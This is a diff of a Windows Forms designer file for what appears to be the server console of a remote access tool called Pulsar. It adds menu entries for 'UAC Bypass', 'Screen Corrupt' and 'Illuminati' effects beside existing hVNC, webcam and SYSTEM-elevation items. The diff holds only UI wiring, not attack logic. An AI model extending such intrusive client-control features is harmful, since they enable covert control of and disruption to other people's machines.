@@ -98,18 +98,20 @@ namespace Pulsar.Server.Forms
             this.swapMouseButtonsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.hideTaskBarToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.gdiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.pixelCorruptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.screenCorruptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.illuminatiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.connectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.elevatedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.elevateClientPermissionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.elevateToSystemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.deElevateFromSystemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.uACBypassToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.nicknameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.blockIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.updateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.reconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.blockIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.lineToolStripMenuItem = new System.Windows.Forms.ToolStripSeparator();
             this.selectAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.imgFlags = new System.Windows.Forms.ImageList(this.components);
@@ -601,19 +603,28 @@ namespace Pulsar.Server.Forms
             // gdiToolStripMenuItem
             // 
             this.gdiToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.pixelCorruptToolStripMenuItem});
+            this.screenCorruptToolStripMenuItem,
+            this.illuminatiToolStripMenuItem});
             this.gdiToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.pencil;
             this.gdiToolStripMenuItem.Name = "gdiToolStripMenuItem";
             this.gdiToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
             this.gdiToolStripMenuItem.Text = "GDI";
             // 
-            // pixelCorruptToolStripMenuItem
+            // screenCorruptToolStripMenuItem
             // 
-            this.pixelCorruptToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.pencil;
-            this.pixelCorruptToolStripMenuItem.Name = "pixelCorruptToolStripMenuItem";
-            this.pixelCorruptToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
-            this.pixelCorruptToolStripMenuItem.Text = "Pixel Corrupt";
-            this.pixelCorruptToolStripMenuItem.Click += new System.EventHandler(this.pixelCorruptToolStripMenuItem_Click);
+            this.screenCorruptToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.pencil;
+            this.screenCorruptToolStripMenuItem.Name = "screenCorruptToolStripMenuItem";
+            this.screenCorruptToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
+            this.screenCorruptToolStripMenuItem.Text = "Screen Corrupt";
+            this.screenCorruptToolStripMenuItem.Click += new System.EventHandler(this.screenCorruptToolStripMenuItem_Click);
+            // 
+            // illuminatiToolStripMenuItem
+            // 
+            this.illuminatiToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.pencil;
+            this.illuminatiToolStripMenuItem.Name = "illuminatiToolStripMenuItem";
+            this.illuminatiToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
+            this.illuminatiToolStripMenuItem.Text = "Illuminati";
+            this.illuminatiToolStripMenuItem.Click += new System.EventHandler(this.illuminatiToolStripMenuItem_Click);
             // 
             // connectionToolStripMenuItem
             // 
@@ -635,7 +646,8 @@ namespace Pulsar.Server.Forms
             this.elevatedToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.elevateClientPermissionsToolStripMenuItem,
             this.elevateToSystemToolStripMenuItem,
-            this.deElevateFromSystemToolStripMenuItem});
+            this.deElevateFromSystemToolStripMenuItem,
+            this.uACBypassToolStripMenuItem});
             this.elevatedToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.uac_shield;
             this.elevatedToolStripMenuItem.Name = "elevatedToolStripMenuItem";
             this.elevatedToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
@@ -665,6 +677,14 @@ namespace Pulsar.Server.Forms
             this.deElevateFromSystemToolStripMenuItem.Text = "DeElevate From System";
             this.deElevateFromSystemToolStripMenuItem.Click += new System.EventHandler(this.deElevateToolStripMenuItem_Click);
             // 
+            // uACBypassToolStripMenuItem
+            // 
+            this.uACBypassToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.uac_shield;
+            this.uACBypassToolStripMenuItem.Name = "uACBypassToolStripMenuItem";
+            this.uACBypassToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
+            this.uACBypassToolStripMenuItem.Text = "UAC Bypass";
+            this.uACBypassToolStripMenuItem.Click += new System.EventHandler(this.uACBypassToolStripMenuItem_Click);
+            // 
             // nicknameToolStripMenuItem
             // 
             this.nicknameToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.uac_shield;
@@ -672,6 +692,14 @@ namespace Pulsar.Server.Forms
             this.nicknameToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.nicknameToolStripMenuItem.Text = "Nickname";
             this.nicknameToolStripMenuItem.Click += new System.EventHandler(this.nicknameToolStripMenuItem_Click);
+            // 
+            // blockIPToolStripMenuItem
+            // 
+            this.blockIPToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.delete;
+            this.blockIPToolStripMenuItem.Name = "blockIPToolStripMenuItem";
+            this.blockIPToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.blockIPToolStripMenuItem.Text = "Block IP";
+            this.blockIPToolStripMenuItem.Click += new System.EventHandler(this.blockIPToolStripMenuItem_Click);
             // 
             // updateToolStripMenuItem
             // 
@@ -704,14 +732,6 @@ namespace Pulsar.Server.Forms
             this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.uninstallToolStripMenuItem.Text = "Uninstall";
             this.uninstallToolStripMenuItem.Click += new System.EventHandler(this.uninstallToolStripMenuItem_Click);
-            // 
-            // blockIPToolStripMenuItem
-            // 
-            this.blockIPToolStripMenuItem.Image = global::Pulsar.Server.Properties.Resources.delete;
-            this.blockIPToolStripMenuItem.Name = "blockIPToolStripMenuItem";
-            this.blockIPToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-            this.blockIPToolStripMenuItem.Text = "Block IP";
-            this.blockIPToolStripMenuItem.Click += new System.EventHandler(this.blockIPToolStripMenuItem_Click);
             // 
             // lineToolStripMenuItem
             // 
@@ -1819,6 +1839,7 @@ namespace Pulsar.Server.Forms
             this.dotNetBarTabControl1.Location = new System.Drawing.Point(156, 3);
             this.dotNetBarTabControl1.Name = "dotNetBarTabControl1";
             this.dotNetBarTabControl1.SelectedIndex = 0;
+            this.dotNetBarTabControl1.ShowCloseButtons = false;
             this.dotNetBarTabControl1.Size = new System.Drawing.Size(977, 459);
             this.dotNetBarTabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
             this.dotNetBarTabControl1.TabIndex = 1;
@@ -2247,8 +2268,6 @@ namespace Pulsar.Server.Forms
         private System.Windows.Forms.NotifyIcon notifyIcon;
         private System.Windows.Forms.ToolStripSeparator lineToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem selectAllToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem addFakeClientsToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem removeFakeClientsToolStripMenuItem;
         private System.Windows.Forms.TableLayoutPanel tableLayoutPanel;
         private System.Windows.Forms.MenuStrip menuStrip;
         private System.Windows.Forms.ToolStripMenuItem settingsToolStripMenuItem;
@@ -2270,7 +2289,8 @@ namespace Pulsar.Server.Forms
         private ToolStripMenuItem cWToolStripMenuItem;
         private ToolStripMenuItem swapMouseButtonsToolStripMenuItem;
         private ToolStripMenuItem gdiToolStripMenuItem;
-        private ToolStripMenuItem pixelCorruptToolStripMenuItem;
+        private ToolStripMenuItem screenCorruptToolStripMenuItem;
+        private ToolStripMenuItem illuminatiToolStripMenuItem;
         private ToolStripMenuItem hVNCToolStripMenuItem;
         private ToolStripMenuItem webcamToolStripMenuItem;
         private ToolStripMenuItem hideTaskBarToolStripMenuItem;
@@ -2394,5 +2414,6 @@ namespace Pulsar.Server.Forms
         private ColumnHeader columnHeader13;
         private TabPage tabPage7;
         private ToolStripMenuItem blockIPToolStripMenuItem;
+        private ToolStripMenuItem uACBypassToolStripMenuItem;
     }
 }
